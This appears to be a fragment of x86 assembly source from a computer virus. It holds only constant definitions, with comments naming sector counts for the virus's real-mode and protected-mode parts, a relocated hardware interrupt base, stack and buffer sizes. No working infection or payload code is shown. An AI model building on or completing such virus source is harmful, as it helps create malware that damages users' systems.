

BUF_SIZE        EQU     2               ;Internal disk buffer size, in sectors, minimum=2
IOMAP_SIZE      EQU     801H
VIDEO_SEG       EQU     0B800H          ;segment for video ram
STACK_SIZE      EQU     300H            ;size of stacks used in this pgm
NEW_INT_LOC     EQU     20H             ;new location for base of hardware interrupts
REAL_SECTORS    EQU     7               ;number of sectors in the virus for real mode operation
PROT_SECTORS    EQU     4               ;number of sectors in the virus for protected mode operation

